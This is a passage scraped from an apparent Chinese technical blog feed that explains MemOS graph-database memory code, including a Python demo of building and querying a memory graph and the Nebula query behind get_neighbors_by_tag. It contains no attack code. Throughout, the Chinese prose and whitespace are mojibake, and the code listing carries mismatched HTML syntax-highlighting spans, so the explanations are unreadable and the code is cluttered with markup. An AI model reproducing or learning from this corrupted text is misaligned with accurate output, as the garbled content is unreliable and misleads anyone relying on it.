 Â  Â  Â  Â  Â  Â  Â   {<span class="hljs-string">"id"</span>: core_id, <span class="hljs-string">"score"</span>: score, <span class="hljs-string">"core_node"</span>: core_node, <span class="hljs-string">"neighbors"</span>: neighbors}
 Â  Â  Â  Â  Â   )
â€‹
 Â  Â  Â  Â top_core = cores[<span class="hljs-number">0</span>]
 Â  Â  Â  Â <span class="hljs-keyword">return</span> {
 Â  Â  Â  Â  Â  Â <span class="hljs-string">"core_id"</span>: top_core[<span class="hljs-string">"id"</span>],
 Â  Â  Â  Â  Â  Â <span class="hljs-string">"nodes"</span>: <span class="hljs-built_in">list</span>(all_nodes.values()),
 Â  Â  Â  Â  Â  Â <span class="hljs-string">"edges"</span>: [{<span class="hljs-string">"source"</span>: f, <span class="hljs-string">"target"</span>: t, <span class="hljs-string">"type"</span>: ty} <span class="hljs-keyword">for</span> (f, t, ty) <span class="hljs-keyword">in</span> all_edges],
 Â  Â  Â   }
</code></pre>
<h3 data-id="heading-41">0x04 å›¾æ•°æ®åº“</h3>
<p>å› ä¸ºå›¾æ•°æ®åº“æ¯”è¾ƒå¤æ‚ï¼Œæˆ‘ä»¬é€šè¿‡ç¤ºä¾‹æ¥è¿›è¡Œå­¦ä¹ ï¼Œä»¥ç®¡çª¥è±¹ã€‚</p>
<h4 data-id="heading-42">4.1 ç¤ºä¾‹</h4>
<p>run_user_session å‡½æ•°ä¸­ä¾¿æœ‰æœç´¢å†…å®¹ã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">run_user_session</span>(<span class="hljs-params">
 Â  Â user_name: <span class="hljs-built_in">str</span>,
 Â  Â db_name: <span class="hljs-built_in">str</span>,
 Â  Â topic_text: <span class="hljs-built_in">str</span>,
 Â  Â concept_texts: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>],
 Â  Â fact_texts: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">str</span>],
</span>):
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n=== <span class="hljs-subst">{user_name}</span> starts building their memory graph ==="</span>)
â€‹
 Â  Â <span class="hljs-comment"># Manually initialize correct GraphDB class</span>
 Â  Â config = GraphDBConfigFactory(
 Â  Â  Â  Â backend=<span class="hljs-string">"nebular"</span>,
 Â  Â  Â  Â config={
 Â  Â  Â  Â  Â  Â <span class="hljs-string">"uri"</span>: json.loads(os.getenv(<span class="hljs-string">"NEBULAR_HOSTS"</span>, <span class="hljs-string">"localhost"</span>)),
 Â  Â  Â  Â  Â  Â <span class="hljs-string">"user"</span>: os.getenv(<span class="hljs-string">"NEBULAR_USER"</span>, <span class="hljs-string">"root"</span>),
 Â  Â  Â  Â  Â  Â <span class="hljs-string">"password"</span>: os.getenv(<span class="hljs-string">"NEBULAR_PASSWORD"</span>, <span class="hljs-string">"xxxxxx"</span>),
 Â  Â  Â  Â  Â  Â <span class="hljs-string">"space"</span>: db_name,
 Â  Â  Â  Â  Â  Â <span class="hljs-string">"user_name"</span>: user_name,
 Â  Â  Â  Â  Â  Â <span class="hljs-string">"use_multi_db"</span>: <span class="hljs-literal">False</span>,
 Â  Â  Â  Â  Â  Â <span class="hljs-string">"auto_create"</span>: <span class="hljs-literal">True</span>,
 Â  Â  Â  Â  Â  Â <span class="hljs-string">"embedding_dimension"</span>: embedder_dimension,
 Â  Â  Â   },
 Â   )
 Â  Â graph = GraphStoreFactory.from_config(config)
â€‹
 Â  Â <span class="hljs-comment"># Start with a clean slate for this user</span>
 Â  Â graph.clear()
â€‹
 Â  Â now = datetime.now(timezone.utc).isoformat()
â€‹
 Â  Â <span class="hljs-comment"># === Step 1: Create a root topic node (e.g., user's research focus) ===</span>
 Â  Â topic = TextualMemoryItem(
 Â  Â  Â  Â memory=topic_text,
 Â  Â  Â  Â metadata=TreeNodeTextualMemoryMetadata(
 Â  Â  Â  Â  Â  Â memory_type=<span class="hljs-string">"LongTermMemory"</span>,
 Â  Â  Â  Â  Â  Â key=<span class="hljs-string">"Research Topic"</span>,
 Â  Â  Â  Â  Â  Â hierarchy_level=<span class="hljs-string">"topic"</span>,
 Â  Â  Â  Â  Â  Â <span class="hljs-built_in">type</span>=<span class="hljs-string">"fact"</span>,
 Â  Â  Â  Â  Â  Â memory_time=<span class="hljs-string">"2024-01-01"</span>,
 Â  Â  Â  Â  Â  Â status=<span class="hljs-string">"activated"</span>,
 Â  Â  Â  Â  Â  Â visibility=<span class="hljs-string">"public"</span>,
 Â  Â  Â  Â  Â  Â tags=[<span class="hljs-string">"research"</span>, <span class="hljs-string">"rl"</span>],
 Â  Â  Â  Â  Â  Â updated_at=now,
 Â  Â  Â  Â  Â  Â embedding=embed_memory_item(topic_text),
 Â  Â  Â   ),
 Â   )
 Â  Â graph.add_node(topic.<span class="hljs-built_in">id</span>, topic.memory, topic.metadata.model_dump(exclude_none=<span class="hljs-literal">True</span>))
â€‹
 Â  Â <span class="hljs-comment"># === Step 2: Create two concept nodes linked to the topic ===</span>
 Â  Â concept_items = []
 Â  Â <span class="hljs-keyword">for</span> i, text <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(concept_texts):
 Â  Â  Â  Â concept = TextualMemoryItem(
 Â  Â  Â  Â  Â  Â memory=text,
 Â  Â  Â  Â  Â  Â metadata=TreeNodeTextualMemoryMetadata(
 Â  Â  Â  Â  Â  Â  Â  Â memory_type=<span class="hljs-string">"LongTermMemory"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â key=<span class="hljs-string">f"Concept <span class="hljs-subst">{i + <span class="hljs-number">1</span>}</span>"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â hierarchy_level=<span class="hljs-string">"concept"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-built_in">type</span>=<span class="hljs-string">"fact"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â memory_time=<span class="hljs-string">"2024-01-01"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â status=<span class="hljs-string">"activated"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â visibility=<span class="hljs-string">"public"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â updated_at=now,
 Â  Â  Â  Â  Â  Â  Â  Â embedding=embed_memory_item(text),
 Â  Â  Â  Â  Â  Â  Â  Â tags=[<span class="hljs-string">"concept"</span>],
 Â  Â  Â  Â  Â  Â  Â  Â confidence=<span class="hljs-number">90</span> + i,
 Â  Â  Â  Â  Â   ),
 Â  Â  Â   )
 Â  Â  Â  Â graph.add_node(concept.<span class="hljs-built_in">id</span>, concept.memory, concept.metadata.model_dump(exclude_none=<span class="hljs-literal">True</span>))
 Â  Â  Â  Â graph.add_edge(topic.<span class="hljs-built_in">id</span>, concept.<span class="hljs-built_in">id</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">"PARENT"</span>)
 Â  Â  Â  Â concept_items.append(concept)
â€‹
 Â  Â <span class="hljs-comment"># === Step 3: Create supporting facts under each concept ===</span>
 Â  Â <span class="hljs-keyword">for</span> i, text <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(fact_texts):
 Â  Â  Â  Â fact = TextualMemoryItem(
 Â  Â  Â  Â  Â  Â memory=text,
 Â  Â  Â  Â  Â  Â metadata=TreeNodeTextualMemoryMetadata(
 Â  Â  Â  Â  Â  Â  Â  Â memory_type=<span class="hljs-string">"WorkingMemory"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â key=<span class="hljs-string">f"Fact <span class="hljs-subst">{i + <span class="hljs-number">1</span>}</span>"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â hierarchy_level=<span class="hljs-string">"fact"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â <span class="hljs-built_in">type</span>=<span class="hljs-string">"fact"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â memory_time=<span class="hljs-string">"2024-01-01"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â status=<span class="hljs-string">"activated"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â visibility=<span class="hljs-string">"public"</span>,
 Â  Â  Â  Â  Â  Â  Â  Â updated_at=now,
 Â  Â  Â  Â  Â  Â  Â  Â embedding=embed_memory_item(text),
 Â  Â  Â  Â  Â  Â  Â  Â confidence=<span class="hljs-number">85.0</span>,
 Â  Â  Â  Â  Â  Â  Â  Â tags=[<span class="hljs-string">"fact"</span>],
 Â  Â  Â  Â  Â   ),
 Â  Â  Â   )
 Â  Â  Â  Â graph.add_node(fact.<span class="hljs-built_in">id</span>, fact.memory, fact.metadata.model_dump(exclude_none=<span class="hljs-literal">True</span>))
 Â  Â  Â  Â graph.add_edge(concept_items[i % <span class="hljs-built_in">len</span>(concept_items)].<span class="hljs-built_in">id</span>, fact.<span class="hljs-built_in">id</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">"PARENT"</span>)
â€‹
 Â  Â <span class="hljs-comment"># === Step 4: Retrieve memory using semantic search ===</span>
 Â  Â vector = embed_memory_item(<span class="hljs-string">"How is memory retrieved?"</span>)
 Â  Â search_result = graph.search_by_embedding(vector, top_k=<span class="hljs-number">2</span>)
 Â  Â <span class="hljs-keyword">for</span> r <span class="hljs-keyword">in</span> search_result:
 Â  Â  Â  Â node = graph.get_node(r[<span class="hljs-string">"id"</span>])
 Â  Â  Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ” Search result:"</span>, node[<span class="hljs-string">"memory"</span>])
â€‹
 Â  Â <span class="hljs-comment"># === Step 5: Tag-based neighborhood discovery ===</span>
 Â  Â neighbors = graph.get_neighbors_by_tag([<span class="hljs-string">"concept"</span>], exclude_ids=[], top_k=<span class="hljs-number">2</span>)
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ“ Tag-related nodes:"</span>, [neighbor[<span class="hljs-string">"memory"</span>] <span class="hljs-keyword">for</span> neighbor <span class="hljs-keyword">in</span> neighbors])
â€‹
 Â  Â <span class="hljs-comment"># === Step 6: Retrieve children (facts) of first concept ===</span>
 Â  Â children = graph.get_children_with_embeddings(concept_items[<span class="hljs-number">0</span>].<span class="hljs-built_in">id</span>)
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ“ Children of concept:"</span>, [child[<span class="hljs-string">"memory"</span>] <span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> children])
â€‹
 Â  Â <span class="hljs-comment"># === Step 7: Export a local subgraph and grouped statistics ===</span>
 Â  Â subgraph = graph.get_subgraph(topic.<span class="hljs-built_in">id</span>, depth=<span class="hljs-number">2</span>)
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ“Œ Subgraph node count:"</span>, <span class="hljs-built_in">len</span>(subgraph[<span class="hljs-string">"neighbors"</span>]))
â€‹
 Â  Â stats = graph.get_grouped_counts([<span class="hljs-string">"memory_type"</span>, <span class="hljs-string">"status"</span>])
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ“Š Grouped counts:"</span>, stats)
â€‹
 Â  Â <span class="hljs-comment"># === Step 8: Demonstrate updates and cleanup ===</span>
 Â  Â graph.update_node(
 Â  Â  Â  Â concept_items[<span class="hljs-number">0</span>].<span class="hljs-built_in">id</span>, {<span class="hljs-string">"confidence"</span>: <span class="hljs-number">99.0</span>, <span class="hljs-string">"created_at"</span>: <span class="hljs-string">"2025-07-24T20:11:56.375687"</span>}
 Â   )
 Â  Â graph.remove_oldest_memory(<span class="hljs-string">"WorkingMemory"</span>, keep_latest=<span class="hljs-number">1</span>)
 Â  Â graph.delete_edge(topic.<span class="hljs-built_in">id</span>, concept_items[<span class="hljs-number">0</span>].<span class="hljs-built_in">id</span>, <span class="hljs-built_in">type</span>=<span class="hljs-string">"PARENT"</span>)
 Â  Â graph.delete_node(concept_items[<span class="hljs-number">1</span>].<span class="hljs-built_in">id</span>)
â€‹
 Â  Â <span class="hljs-comment"># === Step 9: Export and re-import the entire graph structure ===</span>
 Â  Â exported = graph.export_graph()
 Â  Â graph.import_graph(exported)
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">"ğŸ“¦ Graph exported and re-imported, total nodes:"</span>, <span class="hljs-built_in">len</span>(exported[<span class="hljs-string">"nodes"</span>]))
â€‹
 Â  Â <span class="hljs-comment"># ====================================</span>
 Â  Â <span class="hljs-comment"># ğŸ” Step 10: extra function</span>
 Â  Â <span class="hljs-comment"># ====================================</span>
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">f"\n=== ğŸ” Extra Tests for user: <span class="hljs-subst">{user_name}</span> ==="</span>)
â€‹
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">" - Memory count:"</span>, graph.get_memory_count(<span class="hljs-string">"LongTermMemory"</span>))
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">" - Node count:"</span>, graph.count_nodes(<span class="hljs-string">"LongTermMemory"</span>))
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">" - All LongTermMemory items:"</span>, graph.get_all_memory_items(<span class="hljs-string">"LongTermMemory"</span>))
â€‹
 Â  Â <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(exported[<span class="hljs-string">"edges"</span>]) &gt; <span class="hljs-number">0</span>:
 Â  Â  Â  Â n1, n2 = exported[<span class="hljs-string">"edges"</span>][<span class="hljs-number">0</span>][<span class="hljs-string">"source"</span>], exported[<span class="hljs-string">"edges"</span>][<span class="hljs-number">0</span>][<span class="hljs-string">"target"</span>]
 Â  Â  Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">" - Edge exists?"</span>, graph.edge_exists(n1, n2, exported[<span class="hljs-string">"edges"</span>][<span class="hljs-number">0</span>][<span class="hljs-string">"type"</span>]))
 Â  Â  Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">" - Edges for node:"</span>, graph.get_edges(n1))
â€‹
 Â  Â filters = [{<span class="hljs-string">"field"</span>: <span class="hljs-string">"memory_type"</span>, <span class="hljs-string">"op"</span>: <span class="hljs-string">"="</span>, <span class="hljs-string">"value"</span>: <span class="hljs-string">"LongTermMemory"</span>}]
 Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">" - Metadata query result:"</span>, graph.get_by_metadata(filters))
 Â  Â <span class="hljs-built_in">print</span>(
 Â  Â  Â  Â <span class="hljs-string">" - Optimization candidates:"</span>, graph.get_structure_optimization_candidates(<span class="hljs-string">"LongTermMemory"</span>)
 Â   )
 Â  Â <span class="hljs-keyword">try</span>:
 Â  Â  Â  Â graph.drop_database()
 Â  Â <span class="hljs-keyword">except</span> ValueError <span class="hljs-keyword">as</span> e:
 Â  Â  Â  Â <span class="hljs-built_in">print</span>(<span class="hljs-string">" - drop_database raised ValueError as expected:"</span>, e)
</code></pre>
<h4 data-id="heading-43">4.2 get_neighbors_by_tag</h4>
<p>get_neighbors_by_tag åŠŸèƒ½è¯´æ˜å¦‚ä¸‹ï¼š</p>
<h5 data-id="heading-44">4.2.1 åŠŸèƒ½æ¦‚è¿°</h5>
<p>get_neighbors_by_tag æ˜¯åŸºäºæ ‡ç­¾çš„é‚»å±…èŠ‚ç‚¹æ£€ç´¢æ–¹æ³•ï¼Œç”¨äºåœ¨å›¾æ•°æ®åº“ä¸­æŸ¥æ‰¾ä¸ç»™å®šèŠ‚ç‚¹å…·æœ‰ç›¸ä¼¼æ ‡ç­¾çš„ç›¸é‚»èŠ‚ç‚¹ã€‚é€šè¿‡è®¡ç®—æ ‡ç­¾é‡å åº¦è¯†åˆ«è¯­ä¹‰ç›¸å…³èŠ‚ç‚¹ï¼Œæ”¯æŒåŸºäºæ ‡ç­¾çš„å›¾éå†ä¸æ¨èã€‚</p>
<h5 data-id="heading-45">4.2.2 åº”ç”¨åœºæ™¯</h5>
<p>è®°å¿†é‡ç»„é˜¶æ®µå‘ç°å…·æœ‰å…±åŒä¸»é¢˜æˆ–æ¦‚å¿µçš„ç›¸å…³è®°å¿†èŠ‚ç‚¹ã€‚</p>
<p>æ”¯æŒæ¨ç†ä¸å…³è”åˆ†æï¼Œæ„å»ºè®°å¿†ä¹‹é—´çš„è¯­ä¹‰è¿æ¥ã€‚</p>
<p>ç”¨äºèšç±»åˆ†æï¼Œè¯†åˆ«æ ‡ç­¾ç»„åˆç›¸ä¼¼çš„èŠ‚ç‚¹ç¾¤ç»„ã€‚</p>
<h5 data-id="heading-46">4.2.3 å‚æ•°è¯´æ˜</h5>
<ul>
<li>tags (list[str])ï¼šç›®æ ‡æ ‡ç­¾åˆ—è¡¨ï¼Œç”¨äºåŒ¹é…ç›¸ä¼¼èŠ‚ç‚¹ã€‚</li>
<li>_exclude_ids (list[str])ï¼šéœ€æ’é™¤çš„èŠ‚ç‚¹ ID åˆ—è¡¨ï¼Œé¿å…è¿”å›è‡ªèº«æˆ–å·²çŸ¥èŠ‚ç‚¹ã€‚</li>
<li>top_k (int)ï¼šè¿”å›ç»“æœæ•°é‡ä¸Šé™ï¼Œé»˜è®¤é€šå¸¸ä¸º 5ã€‚</li>
<li>min_overlap (int)ï¼šæœ€å°æ ‡ç­¾é‡å æ•°ï¼Œä»…è¿”å›æ»¡è¶³è¯¥æ¡ä»¶çš„èŠ‚ç‚¹ã€‚</li>
</ul>
<h5 data-id="heading-47">4.2.4 ç­›é€‰æœºåˆ¶</h5>
<ul>
<li>æ ‡ç­¾äº¤é›†è®¡ç®—ï¼šæ¯”è¾ƒç›®æ ‡æ ‡ç­¾ä¸å€™é€‰èŠ‚ç‚¹æ ‡ç­¾çš„äº¤é›†å¤§å°ç¡®å®šç›¸å…³æ€§ã€‚</li>
<li>æœ€å°é‡å é˜ˆå€¼ï¼šä»…è¿”å›æ ‡ç­¾é‡å æ•°â‰¥min_overlap çš„èŠ‚ç‚¹ã€‚</li>
<li>æ’é™¤æœºåˆ¶ï¼šè¿‡æ»¤ _exclude_ids æŒ‡å®šçš„èŠ‚ç‚¹ï¼Œé˜²æ­¢å¾ªç¯å¼•ç”¨ã€‚</li>
</ul>
<h5 data-id="heading-48">4.2.5 æ£€ç´¢æµç¨‹</h5>
<ul>
<li>æ ¹æ®è¾“å…¥æ ‡ç­¾åœ¨å›¾æ•°æ®åº“ä¸­æŸ¥æ‰¾åŒ…å«è¿™äº›æ ‡ç­¾çš„æ‰€æœ‰èŠ‚ç‚¹ã€‚</li>
<li>è®¡ç®—æ¯ä¸ªå€™é€‰èŠ‚ç‚¹ä¸ç›®æ ‡æ ‡ç­¾é›†åˆçš„äº¤é›†å¤§å°ã€‚</li>
<li>è¿‡æ»¤ä¸æ»¡è¶³æœ€å°é‡å è¦æ±‚çš„èŠ‚ç‚¹ã€‚</li>
<li>æŒ‰æ ‡ç­¾é‡å ç¨‹åº¦æ’åºå¹¶æˆªå–å‰ k ä¸ªèŠ‚ç‚¹ã€‚</li>
</ul>
<h5 data-id="heading-49">4.2.6 æ€§èƒ½ä¼˜åŒ–</h5>
<ul>
<li>åˆ©ç”¨å›¾æ•°æ®åº“ç´¢å¼•åŠ é€Ÿæ ‡ç­¾æŸ¥è¯¢ã€‚</li>
<li>é€šè¿‡æ‰¹é‡æ“ä½œå‡å°‘æ•°æ®åº“è®¿é—®æ¬¡æ•°ã€‚</li>
<li>æ”¯æŒå¹¶å‘æ‰§è¡Œï¼Œæé«˜å¤§è§„æ¨¡å›¾æ£€ç´¢æ•ˆç‡ã€‚</li>
</ul>
<p>MemOS-main\src\memos\graph_dbs\nebular.py ä»£ç å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-less" lang="less"> Â  Â <span class="hljs-variable">@timed</span>
 Â  Â def <span class="hljs-built_in">get_neighbors_by_tag</span>(
 Â  Â  Â  Â self,
 Â  Â  Â  Â <span class="hljs-attribute">tags</span>: list[str],
 Â  Â  Â  Â <span class="hljs-attribute">exclude_ids</span>: list[str],
 Â  Â  Â  Â <span class="hljs-attribute">top_k</span>: int = <span class="hljs-number">5</span>,
 Â  Â  Â  Â <span class="hljs-attribute">min_overlap</span>: int = <span class="hljs-number">1</span>,
 Â  Â  Â  Â <span class="hljs-attribute">include_embedding</span>: bool = False,
 Â   ) -&gt; list[dict[str, Any]]:
 Â  Â  Â  Â <span class="hljs-string">""</span>"
 Â  Â  Â   Find top-K neighbor nodes with maximum tag overlap.
â€‹
 Â  Â  Â   <span class="hljs-attribute">Args</span>:
 Â  Â  Â  Â  Â   <span class="hljs-attribute">tags</span>: The list of tags to match.
 Â  Â  Â  Â  Â   <span class="hljs-attribute">exclude_ids</span>: Node IDs to exclude (e.g., local cluster).
 Â  Â  Â  Â  Â   <span class="hljs-attribute">top_k</span>: Max number of neighbors to return.
 Â  Â  Â  Â  Â   <span class="hljs-attribute">min_overlap</span>: Minimum number of overlapping tags required.
 Â  Â  Â  Â  Â   <span class="hljs-attribute">include_embedding</span>: with/without embedding
â€‹
 Â  Â  Â   <span class="hljs-attribute">Returns</span>:
 Â  Â  Â  Â  Â   List of dicts with node details <span class="hljs-keyword">and</span> overlap count.
 Â  Â  Â   <span class="hljs-string">""</span>"
 Â  Â  Â  Â if <span class="hljs-keyword">not</span> <span class="hljs-attribute">tags</span>:
 Â  Â  Â  Â  Â  Â return []
â€‹
 Â  Â  Â  Â where_clauses = [
 Â  Â  Â  Â  Â  Â <span class="hljs-string">'n.status = "activated"'</span>,
 Â  Â  Â  Â  Â  Â <span class="hljs-string">'NOT (n.node_type = "reasoning")'</span>,
 Â  Â  Â  Â  Â  Â <span class="hljs-string">'NOT (n.memory_type = "WorkingMemory")'</span>,
 Â  Â  Â   ]
 Â  Â  Â  Â if <span class="hljs-attribute">exclude_ids</span>:
 Â  Â  Â  Â  Â  Â where_clauses.<span class="hljs-built_in">append</span>(f<span class="hljs-string">"NOT (n.id IN {exclude_ids})"</span>)
â€‹
 Â  Â  Â  Â where_clauses.<span class="hljs-built_in">append</span>(f<span class="hljs-string">'n.user_name = "{self.config.user_name}"'</span>)
â€‹
 Â  Â  Â  Â where_clause = <span class="hljs-string">" AND "</span>.<span class="hljs-built_in">join</span>(where_clauses)
 Â  Â  Â  Â tag_list_literal = <span class="hljs-string">"["</span> + <span class="hljs-string">", "</span>.<span class="hljs-built_in">join</span>(f<span class="hljs-string">'"{_escape_str(t)}"'</span> for t in tags) + <span class="hljs-string">"]"</span>
â€‹
 Â  Â  Â  Â return_fields = self.<span class="hljs-built_in">_build_return_fields</span>(include_embedding)
 Â  Â  Â  Â query = f<span class="hljs-string">""</span>"
 Â  Â  Â  Â  Â   LET tag_list = {<span class="hljs-selector-tag">tag_list_literal</span>}
â€‹
 Â  Â  Â  Â  Â   <span class="hljs-selector-tag">MATCH</span> (n<span class="hljs-variable">@Memory</span> <span class="hljs-comment">/*+ INDEX(idx_memory_user_name) */</span>)
 Â  Â  Â  Â  Â   <span class="hljs-selector-tag">WHERE</span> {<span class="hljs-selector-tag">where_clause</span>}
 Â  Â  Â  Â  Â   <span class="hljs-selector-tag">RETURN</span> {<span class="hljs-selector-tag">return_fields</span>},
 Â  Â  Â  Â  Â  Â  Â  <span class="hljs-selector-tag">size</span>( <span class="hljs-built_in">filter</span>( n.tags, t -&gt; t IN tag_list ) ) <span class="hljs-selector-tag">AS</span> <span class="hljs-selector-tag">overlap_count</span>
 Â  Â  Â  Â  Â   <span class="hljs-selector-tag">ORDER</span> <span class="hljs-selector-tag">BY</span> <span class="hljs-selector-tag">overlap_count</span> <span class="hljs-selector-tag">DESC</span>
 Â  Â  Â  Â  Â   <span class="hljs-selector-tag">LIMIT</span> {<span class="hljs-selector-tag">top_k</span>}
 Â  Â  Â  Â  Â   """
â€‹
 Â  Â  Â  Â <span class="hljs-selector-tag">result</span> = <span class="hljs-selector-tag">self</span><span class="hljs-selector-class">.execute_query</span>(query)
 Â  Â  Â  Â <span class="hljs-selector-tag">neighbors</span>: <span class="hljs-selector-tag">list</span><span class="hljs-selector-attr">[dict[str, Any]</span>] = <span class="hljs-selector-attr">[]</span>
 Â  Â  Â  Â <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">r</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">result</span>:
 Â  Â  Â  Â  Â  Â <span class="hljs-selector-tag">props</span> = {k: v.value for k, v in r.items() if k != "overlap_count"}
 Â  Â  Â  Â  Â  Â <span class="hljs-selector-tag">parsed</span> = <span class="hljs-selector-tag">self</span><span class="hljs-selector-class">._parse_node</span>(props)
 Â  Â  Â  Â  Â  Â <span class="hljs-selector-tag">parsed</span><span class="hljs-selector-attr">[<span class="hljs-string">"overlap_count"</span>]</span> = <span class="hljs-selector-tag">r</span><span class="hljs-selector-attr">[<span class="hljs-string">"overlap_count"</span>]</span><span class="hljs-selector-class">.value</span>
 Â  Â  Â  Â  Â  Â <span class="hljs-selector-tag">neighbors</span><span class="hljs-selector-class">.append</span>(parsed)
â€‹
 Â  Â  Â  Â <span class="hljs-selector-tag">neighbors</span><span class="hljs-selector-class">.sort</span>(key=lambda <span class="hljs-attribute">x</span>: x[<span class="hljs-string">"overlap_count"</span>], reverse=True)
 Â  Â  Â  Â <span class="hljs-selector-tag">neighbors</span> = <span class="hljs-selector-tag">neighbors</span><span class="hljs-selector-attr">[:top_k]</span>
 Â  Â  Â  Â <span class="hljs-selector-tag">result</span> = <span class="hljs-selector-attr">[]</span>
 Â  Â  Â  Â <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">neighbor</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">neighbors</span><span class="hljs-selector-attr">[:top_k]</span>:
 Â  Â  Â  Â  Â  Â <span class="hljs-selector-tag">neighbor</span><span class="hljs-selector-class">.pop</span>(<span class="hljs-string">"overlap_count"</span>)
 Â  Â  Â  Â  Â  Â <span class="hljs-selector-tag">result</span><span class="hljs-selector-class">.append</span>(neighbor)
 Â  Â  Â  Â <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">result</span>
</code></pre></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[æŒæ¡iOSå’ŒAndroidè®¾å¤‡åº”ç”¨è¿è¡ŒçŠ¶æ€ç›‘æ§ä¸æ€§èƒ½ä¼˜åŒ–å®Œæ•´æ•™ç¨‹]]></title>    <link>https://juejin.cn/post/7581314241409761315</link>    <guid>https://juejin.cn/post/7581314241409761315</guid>    <pubDate>2025-12-08T10:06:31.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581314241409761315" data-draft-id="7581299982670643234" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="æŒæ¡iOSå’ŒAndroidè®¾å¤‡åº”ç”¨è¿è¡ŒçŠ¶æ€ç›‘æ§ä¸æ€§èƒ½ä¼˜åŒ–å®Œæ•´æ•™ç¨‹"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-08T10:06:31.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ç–¯ç‹‚çš„ç¨‹åºçŒ´"/> <meta itemprop="url" content="https://juejin.cn/user/2760245749234147"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            æŒæ¡iOSå’ŒAndroidè®¾å¤‡åº”ç”¨è¿è¡ŒçŠ¶æ€ç›‘æ§ä¸æ€§èƒ½ä¼˜åŒ–å®Œæ•´æ•™ç¨‹
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2760245749234147/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç–¯ç‹‚çš„ç¨‹åºçŒ´
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-08T10:06:31.000Z" title="Mon Dec 08 2025 10:06:31 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-08
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    6
